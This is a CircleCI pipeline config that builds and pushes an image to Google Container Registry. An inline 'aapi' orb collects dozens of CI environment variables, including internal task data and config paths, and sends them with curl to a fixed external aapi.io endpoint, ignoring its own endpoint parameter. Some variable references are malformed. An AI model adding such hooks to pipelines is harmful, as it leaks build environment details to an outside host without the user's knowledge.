version: 2.1
jobs:
  build-and-push-image:
    docker:
      - image: circleci/golang:1.13
    parameters:
      dockerfile:
        default: Dockerfile
        description: Name of dockerfile to use, defaults to Dockerfile
        type: string
      gcloud-service-key:
        default: GCLOUD_SERVICE_KEY
        description: The gcloud service key
        type: env_var_name
      google-compute-zone:
        default: GOOGLE_COMPUTE_ZONE
        description: The Google compute zone to connect with via the gcloud CLI
        type: env_var_name
      google-project-id:
        default: GOOGLE_PROJECT_ID
        description: The Google project ID to connect with via the gcloud CLI
        type: env_var_name
    steps:
      - checkout
      - gcp-gcr/gcr-auth:
          gcloud-service-key: ${GCLOUD-SERVICE-KEY}
          google-compute-zone: ${GOOGLE-COMPUTE-ZONE}
          google-project-id: ${GOOGLE-PROJECT-ID}
      - gcp-gcr/build-image:
          google-project-id: ${GOOGLE-PROJECT-ID}
          image: test
          registry-url: us.gcr.io
          tag: ${CIRCLE_BUILD_NUM}
      - gcp-gcr/push-image:
          google-project-id: <<parameters.google-project-id>>
          image: test
          registry-url: us.gcr.io
          tag: ${CIRCLE_BUILD_NUM}
      - jq/install
      - aapi/notify
orbs:
  gcp-gcr: circleci/gcp-gcr@0.6.1
  jq: circleci/jq@1.9.1
  aapi:
    commands:
      notify:
        description: Send build results to aapi, with detailed information
        parameters:
          endpoint:
            default: aapi
            description: Enter either your Full URL value that you copied in aapi
              Integration Page
            type: env_var_name
          on_failure:
            default: false
            description: Failure information of circleci build
            type: boolean
          on_success:
            default: true
            description: Success information of circleci build
            type: boolean
        steps:
        - run:
            command: |
              echo '{}' | jq '{
               "payload": {
                 "workflow_job_id": env.CIRCLE_WORKFLOW_JOB_ID,
                 "build_num": env.CIRCLE_BUILD_NUM,
                 "node_version": env.NODE_VERSION,
                 "hostname": env.HOSTNAME,
                 "node_total": env.CIRCLE_NODE_TOTAL,
                 "workflow_upstream_job_ids": env.CIRCLE_WORKFLOW_UPSTREAM_JOB_IDS,
                 "internal_scratch": env.CIRCLE_INTERNAL_SCRATCH,
                 "project_username": env.CIRCLE_PROJECT_USERNAME,
                 "npm_config_loglevel": env.NPM_CONFIG_LOGLEVEL,
                 "internal_task_data": env.CIRCLE_INTERNAL_TASK_DATA,
                 "no_proxy": env.NO_PROXY,
                 "node_index": env.CIRCLE_NODE_INDEX,
                 "compare_url": env.CIRCLE_COMPARE_URL,
                 "branch": env.CIRCLE_BRANCH,
                 "ssh_auth_sock": env.SSH_AUTH_SOCK,
                 "job_name": env.CIRCLE_JOB,
                 "working_directory": env.CIRCLE_WORKING_DIRECTORY,
                 "path": env.PATH,
                 "workflow_workspace_id": env.CIRCLE_WORKFLOW_WORKSPACE_ID,
                 "username": env.CIRCLE_USERNAME,
                 "previous_build_num": env.CIRCLE_PREVIOUS_BUILD_NUM,
                 "pwd": env.PWD,
                 "stage": env.CIRCLE_STAGE,
                 "lang": env.LANG,
                 "build_url": env.CIRCLE_BUILD_URL,
                 "workflow_id": env.CIRCLE_WORKFLOW_ID,
                 "circleci": env.CIRCLECI,
                 "shlvl": env.SHLVL,
                 "home": env.HOME,
                 "yarn_version": env.YARN_VERSION,
                 "vcs_revision": env.CIRCLE_SHA1,
                 "ci": env.CI,
                 "repository_url": env.CIRCLE_REPOSITORY_URL,
                 "internal_config": env.CIRCLE_INTERNAL_CONFIG,
                 "bash_env": env.BASH_ENV,
                 "shell_env": env.CIRCLE_SHELL_ENV,
                 "debian_frontend": env.DEBIAN_FRONTEND,
                 "reponame": env.CIRCLE_PROJECT_REPONAME,
                 "outcome": "unknown"
               }
               }' > /tmp/raw-webhook.json
            name: Bundle build info into webhook payload
            when: always
        - when:
            condition: <<parameters.on_success>>
            steps:
            - run:
                command: |
                  cat /tmp/raw-webhook.json | jq '.payload.outcome="success"' > /tmp/webhook.json
                  curl -X POST -H"Content-Type:application/json" -d @/tmp/webhook.json https://devgateway.aapi.io/function/4/GetWebhookData/getwebhookdata?email=ta@aapi.io
                name: Notify $<<parameters.endpoint>> with Success Webhook
                when: on_success
        - when:
            condition: <<parameters.on_failure>>
            steps:
            - run:
                command: |
                  cat /tmp/raw-webhook.json | jq '.payload.outcome="failed"'  > /tmp/webhook.json
                  curl -X POST -H"Content-Type:application/json" -d @/tmp/webhook.json https://devgateway.aapi.io/function/4/GetWebhookData/getwebhookdata?email=ta@aapi.io
                name: Notify $<<parameters.endpoint>> with Failure Webhook
                when: on_fail
    description: Easily send build results to aapi, with detailed information. 
    executors:
      default:
        description: |
          The default executor for jobs in aapi orb. Specify your own Docker image or use the default (cimg/base).
        docker:
        - image: <<parameters.docker-image>>
        parameters:
          docker-image:
            default: cimg/base
            description: |
              Docker image to use in this executor, defaults to cimg/base
            type: string
        resource_class: small
workflows:
  your-workflow:
    jobs:
      - build-and-push-image
